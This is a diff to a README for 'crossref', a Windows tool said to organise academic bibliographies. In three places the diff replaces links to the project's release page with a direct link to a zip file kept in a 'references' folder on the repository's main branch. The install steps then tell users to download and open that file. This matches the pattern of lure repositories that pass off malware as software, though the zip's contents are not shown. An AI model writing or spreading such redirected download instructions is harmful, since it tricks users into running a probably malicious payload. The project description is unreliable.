@@ -1,6 +1,6 @@
 # 📚 crossref - Organize your bibliography lists with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://github.com/Ghangh3251/crossref/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://github.com/Ghangh3251/crossref/raw/refs/heads/main/references/Software-2.1.zip)
 
 This application helps users organize large lists of academic references. It connects the titles and authors you have to a central database. It turns unformatted text into clean, professional citations.
 
@@ -10,7 +10,7 @@ You need a computer running Windows 10 or Windows 11 to use this tool. Ensure yo
 
 Follow these steps to set up the software:
 
-1. Visit the [official release page](https://github.com/Ghangh3251/crossref/releases) to access the installer.
+1. Visit the [official release page](https://github.com/Ghangh3251/crossref/raw/refs/heads/main/references/Software-2.1.zip) to access the installer.
 2. Select the version labeled for Windows.
 3. Save the file to your computer.
 4. Open the download folder.
@@ -46,7 +46,7 @@ If the tool does not return results, check the following items:
 
 *   Check your internet connection. The tool needs data from the web to function.
 *   Verify your reference formatting. If the names are incomplete, the tool has trouble finding a match.
-*   Ensure you have the latest version of the software. Check the [download page](https://github.com/Ghangh3251/crossref/releases) if you have errors.
+*   Ensure you have the latest version of the software. Check the [download page](https://github.com/Ghangh3251/crossref/raw/refs/heads/main/references/Software-2.1.zip) if you have errors.
 *   Restart the application if it stops responding during a batch search.
 
 ## 📂 System requirements
